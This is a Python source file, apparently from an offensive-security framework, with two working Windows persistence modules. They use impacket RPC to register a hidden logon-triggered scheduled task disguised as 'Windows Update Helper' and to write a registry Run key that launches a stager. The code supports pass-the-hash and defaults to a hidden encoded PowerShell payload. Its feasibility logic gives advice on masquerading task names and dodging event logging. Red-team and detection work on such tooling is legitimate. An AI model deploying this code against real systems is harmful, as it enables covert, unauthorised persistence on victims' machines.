"""
ARES Persistence Module — Windows Scheduled Task (T1053.005)
                        + Registry Run Key  (T1547.001)

Scheduled Task (ScheduledTaskPersistence):
  impacket dcerpc.v5.tsch — connect \\pipe\\atsvc, bind TSCHS UUID,
  hSchRpcRegisterTask() with XML task definition that runs hidden at LOGON.

Registry Run Key (RegistryRunKeyPersistence):
  impacket dcerpc.v5.rrp — connect \\pipe\\winreg, bind RRP UUID,
  hOpenLocalMachine() → hBaseRegOpenKey(Run key) → hBaseRegSetValue() → hBaseRegCloseKey().

MITRE ATT&CK:
  T1053.005 — Scheduled Task/Job: Scheduled Task
  T1547.001 — Boot or Logon Autostart: Registry Run Keys
"""
from __future__ import annotations

import uuid as _uuid
import xml.sax.saxutils as _xmlesc
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.logger import get_logger, audit
from ares.core.tracing import trace_module
from ares.modules.params import RegistryRunParams, ScheduledTaskParams
from ares.sdk import (
    CircuitBreaker,
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    ProcessPermission,
    module_contract,
)

logger = get_logger("ares.modules.persistence")

# ── XML template for impacket tsch ───────────────────────────────────────────
_TASK_XML_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c "{command}" &gt;NUL 2&gt;&amp;1</Arguments>
    </Exec>
  </Actions>
</Task>"""


def _tsch_register_sync(target: str, username: str, password: str,
                        domain: str, lmhash: str, nthash: str,
                        task_name: str, command: str) -> None:
    """Register a scheduled task via impacket tsch RPC. Sync — call from run_in_executor."""
    from impacket.dcerpc.v5 import transport, tsch     # type: ignore[import]
    from impacket.dcerpc.v5.dtypes import NULL

    string_binding = f"ncacn_np:{target}[\\pipe\\atsvc]"
    rpctransport   = transport.DCERPCTransportFactory(string_binding)
    rpctransport.set_credentials(username, password, domain, lmhash, nthash, None)
    rpctransport.set_connect_timeout(15)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    try:
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        xml       = _TASK_XML_TEMPLATE.replace("{command}", _xmlesc.escape(command))
        task_path = f"\\{task_name}"
        resp      = tsch.hSchRpcRegisterTask(
            dce,
            task_path,
            xml,
            tsch.TASK_CREATE_OR_UPDATE,
            NULL,
            tsch.TASK_LOGON_NONE,
        )
        resp.checkError()
    finally:
        try:
            dce.disconnect()
        except Exception:
            pass


@module_contract(
    permissions=[
        NetworkPermission(ports=[135, 139, 445], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=ScheduledTaskParams,
)
class ScheduledTaskPersistence(BaseModule):
    """
    persistence.scheduled_task — Register a Windows scheduled task that executes at user logon via impacket tsch RPC (T1053.005)

    OPSEC: MEDIUM
    MITRE: "T1053.005"
    REQUIRES: "target", "credential"
    OUTPUTS:  "persistence_established", "task_name"
    """
    MODULE_ID        = "persistence.scheduled_task"
    MODULE_NAME      = "Scheduled Task Persistence"
    MODULE_CATEGORY  = "persistence"
    MODULE_DESCRIPTION = "Register a Windows scheduled task that executes at user logon via impacket tsch RPC (T1053.005)"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    REQUIRES         = ["target", "credential"]
    OUTPUTS          = ["persistence_established", "task_name"]
    MITRE_TECHNIQUES = ["T1053.005"]
    PARAMS_MODEL     = ScheduledTaskParams

    OPSEC_LEVEL      = OpsecLevel.MEDIUM

    async def assess_feasibility(self, ctx: "Any") -> "FeasibilityReport":
        """
        Pre-flight Defense Feasibility Assessment:
        Evaluates task creation risks, Event ID 4698 logging, and noise profile.
        Recommends persistence.wmi_subscription under STEALTH for cleaner footprint.
        """
        from ares.modules.base import FeasibilityReport
        from ares.core.campaign import NoiseProfile
        from ares.core.security import sanitize_hostname

        blockers: list[str] = []
        recommendations: list[str] = []
        opsec_tuning: dict[str, Any] = {}
        score = 1.0
        risk = "medium"

        target = sanitize_hostname(getattr(ctx, "target", "") or getattr(ctx, "params", {}).get("target", ""))
        username = getattr(ctx, "params", {}).get("username", "")

        if not target:
            blockers.append("No target host specified")
            score -= 0.5
        if not username:
            cred = getattr(ctx, "best_credential", lambda: None)()
            if cred:
                username = cred.username
        if not username:
            blockers.append("No local administrator credentials provided")
            score -= 0.4

        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            score = 0.3
            risk = "high_noise"
            blockers.append("Scheduled task registration generates Windows Security Event ID 4698 — blocked in STEALTH")
            recommendations.append("persistence.wmi_subscription")

        session = getattr(ctx, "session", None)
        if session and hasattr(session, "get_host") and target:
            host_state = session.get_host(target)
            if host_state:
                if host_state.has_defense("edr") or host_state.has_defense("task_scheduler_auditing"):
                    risk = "high_noise"
                    score -= 0.2
                    opsec_tuning["masquerade"] = "Task name should mimic standard Microsoft Update tasks (e.g. OneDrive Standalone Update Task)"
                    recommendations.append("persistence.wmi_subscription")

        unique_recs: list[str] = []
        for r in recommendations:
            if r not in unique_recs:
                unique_recs.append(r)

        feasible = len(blockers) == 0 and score >= 0.4
        return FeasibilityReport(
            feasible=feasible,
            score=max(0.0, min(1.0, score)),
            risk_level=risk,
            blockers=blockers,
            recommended_alternatives=unique_recs,
            opsec_tuning=opsec_tuning,
            details={"target": target, "username": username},
        )

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "persistence.scheduled_task requires 'target' — IP of Windows host.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("username"):
            raise ModuleValidationError(
                "persistence.scheduled_task requires 'username' with local_admin_creds.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})

        params = getattr(ctx, "params", {})
        if isinstance(params, ScheduledTaskParams):
            kwargs = params.model_dump()
        elif isinstance(params, dict):
            kwargs = dict(params)
        else:
            kwargs = {}

        raw_pwd = kwargs.get("password") or getattr(ctx, "password", "")
        if hasattr(raw_pwd, "get_secret_value"):
            kwargs["password"] = raw_pwd.get_secret_value()
        elif raw_pwd is not None:
            kwargs["password"] = str(raw_pwd)
        else:
            kwargs["password"] = ""

        if not kwargs.get("target") and getattr(ctx, "target", ""):
            kwargs["target"] = ctx.target

        findings, raw = await self.run(**kwargs)

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for finding in findings:
            ev = EvidenceRecord(
                artifact_id=f"schedtask-{str(finding.host or kwargs.get('target', 'host')).replace(':', '-').replace('/', '-')}",
                source_target=getattr(ctx, "target", kwargs.get("target", "")),
                collected_by=self.MODULE_ID,
                data={
                    "title": finding.title,
                    "task_name": raw.get("task_name", kwargs.get("task_name", "")),
                    "persistence_established": raw.get("persistence_established", False),
                    "mitre": finding.mitre_technique,
                },
                tags=["persistence", "scheduled_task", "t1053_005"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("persistence.scheduled_task")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        ctx       = kwargs.get("ctx") or kwargs
        target    = ctx.get("target", "")
        dry_run   = ctx.get("dry_run", False)   # Fixed: was True (never ran live)
        username  = ctx.get("username", "")
        password  = ctx.get("password", "") or ctx.get("secret", "")
        domain    = ctx.get("domain", "")
        task_name = ctx.get("task_name", "AresUpdater")
        command   = ctx.get("command", r"powershell.exe -NoP -W Hidden -Enc <BASE64_PAYLOAD>")

        # Parse NTLM hash if provided (pass-the-hash support)
        lmhash, nthash = "", ""
        if password and (len(password) == 32 or (len(password) == 65 and ":" in password)):
            parts = password.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts[0], parts[1]
            else:
                nthash = password
            password = ""

        if not target:
            return [], {"error": "no_target"}

        logger.info("persistence_scheduled_task", target=target, task=task_name, dry_run=dry_run)
        audit("persistence_scheduled_task", actor=username or "operator", source="operator",
              target=target, technique="T1053.005")

        finding = Finding(
            title       = f"Persistence via Scheduled Task on {target}",
            description = (f"Task '{task_name}' registered on {target}. "
                           "Executes at every user logon, hidden."),
            severity=Severity.HIGH, confidence=0.95,
            module_id=self.MODULE_ID, host=target,
            mitre_technique="T1053.005", mitre_tactic="Persistence",
            evidence={"task_name": task_name, "command": command},
            remediation=(
                "Remove scheduled task. Review Task Scheduler for unknown entries. "
                "Enable Windows Event 4698 (task created) monitoring."
            ),
        )

        if dry_run:
            return [finding], {
                "dry_run": True,
                "persistence_established": True,
                "task_name": task_name,
                "method": "scheduled_task",
                "mitre": "T1053.005",
            }

        try:
            from impacket.dcerpc.v5 import tsch  # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket_not_installed", "persistence_established": False}

        if not username:
            return [], {"error": "no_credential_username", "persistence_established": False}

        try:
            await self.before_request(target, "default")
            import asyncio as _asyncio
            _loop = _asyncio.get_running_loop()
            await _loop.run_in_executor(
                None,
                lambda: _tsch_register_sync(
                    target, username, password, domain,
                    lmhash, nthash, task_name, command,
                ),
            )
            logger.info("scheduled_task_created", target=target, task=task_name)
            return [finding], {
                "persistence_established": True,
                "task_name": task_name,
                "method": "scheduled_task",
                "mitre": "T1053.005",
            }
        except Exception as exc:
            raise self._classify_error(exc) from exc


# ── Registry Run Key ─────────────────────────────────────────────────────────

_RUN_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"


def _rrp_set_run_key(target: str, username: str, password: str,
                     domain: str, value_name: str, payload: str) -> None:
    """Write a Run key via impacket dcerpc rrp RPC."""
    from impacket.dcerpc.v5 import transport, rrp      # type: ignore[import]
    from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED

    string_binding = f"ncacn_np:{target}[\\pipe\\winreg]"
    rpctransport = transport.DCERPCTransportFactory(string_binding)
    rpctransport.set_credentials(username, password, domain, "", "", None)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)

    hRootKey  = rrp.hOpenLocalMachine(dce)["phKey"]
    hRunKey   = rrp.hBaseRegOpenKey(
        dce, hRootKey, _RUN_KEY,
        samDesired=MAXIMUM_ALLOWED,
    )["phkResult"]

    rrp.hBaseRegSetValue(
        dce, hRunKey,
        value_name + "\x00",
        rrp.REG_SZ,
        (payload + "\x00").encode("utf-16-le"),
    )

    rrp.hBaseRegCloseKey(dce, hRunKey)
    rrp.hBaseRegCloseKey(dce, hRootKey)
    dce.disconnect()


@module_contract(
    permissions=[
        NetworkPermission(ports=[135, 139, 445], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=RegistryRunParams,
)
class RegistryRunKeyPersistence(BaseModule):
    """
    persistence.registry_run — Add payload to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

    OPSEC: MEDIUM
    MITRE: T1547.001
    REQUIRES: local_admin_creds, target
    OUTPUTS:  persistence_established, registry_key
    """
    MODULE_ID        = "persistence.registry_run"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_NAME      = "Registry Run Key Persistence"
    MODULE_CATEGORY  = "persistence"
    MODULE_DESCRIPTION = "Write a Windows registry Run key that executes at user logon via impacket rrp RPC (T1547.001)"
    REQUIRES         = ["target", "credential"]
    OUTPUTS          = ["persistence_established", "registry_key"]
    MITRE_TECHNIQUES = ["T1547.001"]
    PARAMS_MODEL     = RegistryRunParams

    OPSEC_LEVEL      = OpsecLevel.MEDIUM

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "persistence.registry_run requires 'target'.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("username"):
            raise ModuleValidationError(
                "persistence.registry_run requires 'username'.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})

        params = getattr(ctx, "params", {})
        if isinstance(params, RegistryRunParams):
            kwargs = params.model_dump()
        elif isinstance(params, dict):
            kwargs = dict(params)
        else:
            kwargs = {}

        raw_pwd = kwargs.get("password") or getattr(ctx, "password", "")
        if hasattr(raw_pwd, "get_secret_value"):
            kwargs["password"] = raw_pwd.get_secret_value()
        elif raw_pwd is not None:
            kwargs["password"] = str(raw_pwd)
        else:
            kwargs["password"] = ""

        if not kwargs.get("target") and getattr(ctx, "target", ""):
            kwargs["target"] = ctx.target

        # Map key_name / command to value_name / payload if needed
        if "key_name" in kwargs and "value_name" not in kwargs:
            kwargs["value_name"] = kwargs["key_name"]
        if "command" in kwargs and "payload" not in kwargs:
            kwargs["payload"] = kwargs["command"]

        findings, raw = await self.run(**kwargs)

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for finding in findings:
            ev = EvidenceRecord(
                artifact_id=f"regrun-{str(finding.host or kwargs.get('target', 'host')).replace(':', '-').replace('/', '-')}",
                source_target=getattr(ctx, "target", kwargs.get("target", "")),
                collected_by=self.MODULE_ID,
                data={
                    "title": finding.title,
                    "registry_key": raw.get("registry_key", ""),
                    "persistence_established": raw.get("persistence_established", False),
                    "mitre": finding.mitre_technique,
                },
                tags=["persistence", "registry_run", "t1547_001"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("persistence.registry_run_key")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        ctx        = kwargs.get("ctx") or kwargs
        target     = ctx.get("target", "")
        dry_run    = ctx.get("dry_run", True)
        username   = ctx.get("username", "")
        password   = ctx.get("password", "")
        domain     = ctx.get("domain", "")
        value_name = ctx.get("value_name", "AresAgent")
        payload    = ctx.get("payload", r"C:\Windows\Temp\ares_agent.exe")

        if not target:
            return [], {"error": "no_target"}

        logger.info("persistence_registry_run", target=target, value=value_name, dry_run=dry_run)
        audit("persistence_registry_run", actor=username or "operator", source="operator",
              target=target, technique="T1547.001")

        full_key = f"{_RUN_KEY}\\{value_name}"
        finding = Finding(
            title       = f"Persistence via Registry Run Key on {target}",
            description = (f"Run key `{full_key}` written on {target}. "
                           "Stager executes at every user logon."),
            severity=Severity.HIGH, confidence=0.95,
            module_id=self.MODULE_ID, host=target,
            mitre_technique="T1547.001", mitre_tactic="Persistence",
            evidence={"registry_key": full_key, "payload": payload},
            remediation=(
                "Remove the registry Run key. "
                "Deploy detection for Run/RunOnce key writes (Sysmon Event 13)."
            ),
        )

        if dry_run:
            return [finding], {
                "dry_run": True,
                "persistence_established": True,
                "registry_key": full_key,
                "method": "registry_run_key",
                "mitre": "T1547.001",
            }

        try:
            from impacket.dcerpc.v5 import rrp  # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket_not_installed", "persistence_established": False}

        if not username:
            return [], {"error": "no_credential_username", "persistence_established": False}

        try:
            await self.before_request(target, "default")
            _rrp_set_run_key(target, username, password, domain, value_name, payload)
            logger.info("registry_run_key_written", target=target, key=full_key)
            return [finding], {
                "persistence_established": True,
                "registry_key": full_key,
                "method": "registry_run_key",
                "mitre": "T1547.001",
            }
        except Exception as exc:
            raise self._classify_error(exc) from exc
